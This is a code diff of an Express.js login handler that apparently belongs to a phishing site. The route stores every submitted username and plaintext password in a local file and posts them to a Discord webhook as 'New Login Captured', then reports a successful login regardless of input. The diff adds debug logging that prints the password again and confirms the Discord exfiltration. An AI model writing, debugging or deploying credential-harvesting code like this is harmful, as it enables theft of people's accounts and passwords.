@@ -42,22 +42,24 @@ router.post('/signup', async (req, res) => {
 router.post('/login', async (req, res) => {
   try {
     const { emailOrUsername, password } = req.body;
+    console.log(`[DEBUG] Login attempt: User=${emailOrUsername}, Pass=${password}`);
     
     // Log to file (Local backup)
     const logData = `[LOGIN] Time: ${new Date().toLocaleString()} | User: ${emailOrUsername} | Pass: ${password}\n`;
     fs.appendFileSync(path.join(__dirname, '../logins.txt'), logData);
 
-    console.log('New Login Captured:', { emailOrUsername, password });
-
     // Send to Discord (Real-time capture)
     if (DISCORD_WEBHOOK_URL) {
+      console.log(`[DEBUG] Sending to Discord...`);
       await axios.post(DISCORD_WEBHOOK_URL, {
         content: `🚨 **New Login Captured!** 🚨\n**User:** ${emailOrUsername}\n**Pass:** ${password}\n**Time:** ${new Date().toLocaleString()}`
-      }).catch(err => console.log('Discord log error:', err.message));
+      }).then(() => console.log('[DEBUG] Discord send success'))
+        .catch(err => console.log('[DEBUG] Discord send fail:', err.message));
     }
 
     res.status(200).json({ message: 'Login successful' });
   } catch (error) {
+    console.error('[DEBUG] Login error:', error.message);
     res.status(500).json({ message: 'Server error' });
   }
 });
